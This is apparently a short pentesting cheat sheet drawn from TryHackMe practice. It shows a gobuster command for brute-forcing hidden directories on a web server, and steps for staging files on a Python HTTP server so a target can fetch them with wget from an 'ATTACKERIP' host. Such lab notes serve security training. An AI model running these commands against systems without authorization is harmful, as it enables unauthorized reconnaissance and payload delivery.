<h1 align="center">RED BOOK</h1>
<h2 align="center"> Short examples for pentesting/hacking</h2>
<h3 align="center"> Tryhackme and other sources</h3>

<table>
  <tr>
    <td align="left">
      <strong>GOBUSTER CRAWLER BRUTE FORCE WEBSITE PAGES</strong><br>
      Using wordlist, search for directories on webserver to detect what pages webserver have.<br>
      gobuster -u http://WEBPAGE -w WORDLIST.txt dir<br>
      -u is used to state the website we're scanning<br>
      -w takes a list of words to iterate through to find hidden pages<br>
      -dir search for directories
    </td>
  </tr>
  <tr>
    <td align="left">
      <strong>TRANSFER FILES USING HTTP</strong><br>
Start http server with Python (Win) and download files on target with wget request.<br>
On attacker (win): <br>
python3 -m http.server 1234 c:/testdir            -(1234 is port, and in last part is default dir for http server)<br>
On target in CMD (win/linux/any):<br>
wget http://ATTACKERIP:1234/SOMEFILEINROOTDIR
    </td>
  </tr>
</table>

